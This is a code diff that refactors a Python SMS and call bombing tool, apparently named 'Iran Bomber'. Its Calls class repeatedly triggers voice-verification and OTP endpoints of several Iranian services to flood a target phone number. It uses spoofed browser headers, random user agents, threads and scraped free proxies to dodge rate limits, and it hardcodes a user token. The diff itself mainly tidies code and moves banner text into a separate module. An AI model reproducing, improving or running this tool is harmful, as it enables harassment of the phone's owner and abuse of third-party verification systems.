@@ -1,13 +1,15 @@
-# import requests as req
-from requests import post, get
-from pystyle import *
-from sys import argv, exit
-from random import choice
+import sys
+import threading
 from os import path
-from threading import Thread
-from user_agent import generate_user_agent as agent
+from random import choice
 from time import sleep
 
+import requests
+from requests import get, post
+from user_agent import generate_user_agent as agent
+from pystyle import *
+
+import cli_texts
 
 
 class Sms:
@@ -734,24 +736,75 @@ class Sms:
         except: pass
 
 
+import os
+
 class Calls:
-    def __init__(self, phone, proxy) -> None:
-        self.phone, self.proxy = phone, proxy
+    def __init__(self, phone_number, request_proxy):
+        """Initialize Calls instance with phone number and proxy."""
+        self.phone_number = phone_number
+        self.request_proxy = request_proxy
     
     def call1(self):
-        try: 
-            get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{self.phone}',
-                    proxies=self.proxy)
-            persian = get(f"https://api.codebazan.ir/adad/?text={self.phone}").json()
+        """Make phone call using specific URLs."""
+        try:
+            get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{self.phone_number}',
+                proxies=self.request_proxy)
+            persian = get(f"https://api.codebazan.ir/adad/?text={self.phone_number}").json()
             get('https://www.tezolmarket.com/Account/Login',
-                    f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
-            get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{self.phone}&type=IVR')
-        except: pass
-    def call2(self):
-        post(url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{self.phone}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'x-requested-with': 'XMLHttpRequest'})
+                f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
+            get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{self.phone_number}&type=IVR')
+        except Exception as e:
+            print(f"Error in call1: {e}")
 
-    def call3(self):   
-        get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{self.phone}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})
+    def call2(self):
+        """Make another phone call."""
+        try:
+            post(url="https://novinbook.com/index.php?route=account/phone",
+                 data=f"phone=0{self.phone_number}&call=yes",
+                 headers={
+                     'accept': '*/*',
+                     'accept-encoding': 'gzip, deflate, br',
+                     'accept-language': 'en-US,en;q=0.9',
+                     'content-length': '26',
+                     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                     'cookie': 'language=fa; currency=RLS',
+                     'origin': 'https://novinbook.com',
+                     'referer': 'https://novinbook.com/index.php?route=account/phone',
+                     'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+                     'sec-ch-ua-mobile': '?0',
+                     'sec-ch-ua-platform': 'Windows',
+                     'sec-fetch-dest': 'empty',
+                     'sec-fetch-mode': 'cors',
+                     'sec-fetch-site': 'same-origin',
+                     'user-agent': agent(os="win"),
+                     'x-requested-with': 'XMLHttpRequest'
+                 })
+        except Exception as e:
+            print(f"Error in call2: {e}")
+
+    def call3(self):
+        """Make yet another phone call."""
+        try:
+            get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{self.phone_number}",
+                headers={
+                    'accept': '*/*',
+                    'accept-encoding': 'gzip, deflate, br',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'device': 'web',
+                    'deviceid': '6',
+                    'referer': 'https://www.azki.com/',
+                    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': 'Windows',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                    'user-agent': agent(os="win"),
+                    'user-name': 'null',
+                    'user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'
+                })
+        except Exception as e:
+            print(f"Error in call3: {e}")
 
 
 def main(phonenum: str, proxy):
@@ -773,44 +826,14 @@ def main_call(phonenum: str, proxy):
         sleep(5)
 
 if __name__ == "__main__":
-    banner = '''
-
-
-
-            ██╗██████╗  █████╗ ███╗  ██╗
-            ██║██╔══██╗██╔══██╗████╗ ██║
-            ██║██████╔╝███████║██╔██╗██║
-            ██║██╔══██╗██╔══██║██║╚████║
-            ██║██║  ██║██║  ██║██║ ╚███║
-            ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚══╝
-
-    ██████╗  █████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
-    ██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
-    ██████╦╝██║  ██║██╔████╔██║██████╦╝█████╗  ██████╔╝
-    ██╔══██╗██║  ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
-    ██████╦╝╚█████╔╝██║ ╚═╝ ██║██████╦╝███████╗██║  ██║
-    ╚═════╝  ╚════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
-    '''
+    banner = cli_texts.banner
 
     logo = Colorate.Horizontal(Colors.DynamicMIX((Col.cyan, Col.blue, Col.purple)), Center.XCenter(banner))
 
-    # print(logo)
     def err():
         print()
         System.Clear()
-        print('''
-            {2}Usage = {1}python bomber.py +989123456789{2}
-            self.proxy = {1}--self.proxy{2}
-            threads = {1}--threads {4}<amount>{2}
-            {4}>>{3} python bomber.py {1}--proxies --threads 7
-                {4}>>>{5} This will start bombing with proxies and 7 Threads 
-            {0}
-            Tip: 
-                You can use {4}<{0} python bomber.py --scrapp {4}>{0} to
-                get Fresh proxies! 
-                
-            {5}Press Enter 2 times for exit
-    '''.format(Col.cyan, Col.green, Col.light_gray, Col.light_blue, Col.pink, Col.light_red))
+        print(cli_texts.error_msg.format(Col.cyan, Col.green, Col.light_gray, Col.light_blue, Col.pink, Col.light_red))
         print(Col.reset) 
         input() ; input()
         exit()
@@ -824,28 +847,20 @@ if __name__ == "__main__":
         
         def bruh():
             return f"{Col.orange}| {Col.cyan}{count} " if proxies == True else "    "
-        text = '''
-        
-                            {5}Started the Job with {0}{6}{5} thread(s)                   
-                                                    
-                            {2}Phone Number {3}={0} {7}                          
-                                                    
-                            {4}Proxies:                                           
-                                {3}>>> {2}State{4}: {0}{8} {9}                        
-
-
-                    {11}       
-    '''.format(Col.green, Col.cyan, Col.purple, Col.dark_blue, Col.orange, Col.red, threads, number, proxies, bruh(), Col.yellow, Colors.reset)
+        text = cli_texts.successful_start_msg.format(Col.green, Col.cyan, Col.purple, Col.dark_blue, Col.orange, Col.red, threads, number, proxies, bruh(), Col.yellow, Colors.reset)
         return text
 
     def random_proxy():
+        if not path.exists('proxies.txt'):
+            Write.Print(text=cli_texts.no_proxy_file, color=Colors.red_to_yellow, interval=0.000)
+            exit()
         with open('proxies.txt', 'r') as file:
             p = file.readlines()
 
             return choice(p).strip() if len(p) > 0 else None
     if not len(argv) > 1:
         err()
-        # print(Col.reset)
+        
     else:
         num = argv[1]
         args = ' '.join(argv).lower().split('--') if '--' in ' '.join(argv) else False
@@ -871,8 +886,7 @@ if __name__ == "__main__":
                         Thread(target=main, args= (num, random_proxy()), name=str(i)).start()
                     else: print(Center.XCenter(info_table(threads=threads, proxies=True, number=num)))
                         
-                    # else: 
-                    #     end()
+                    
                 elif not 'proxies' in ''.join(args):
                     System.Title(f"Threads: {threads} , Proxies: False, Number: {num}")
                     for i in range(int(threads)):
@@ -892,7 +906,7 @@ if __name__ == "__main__":
                         print('\n')
                         p = get("https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt").text
                         file.write(p)
-                        Write.Print(text="   Your 'proxies.txt' has been updated, Enjoy!", color=Colors.red_to_yellow, interval=0.000)
+                        Write.Print(text=cli_texts.updated_proxy_msg, color=Colors.red_to_yellow, interval=0.000)
 
                 else: 
                     err()
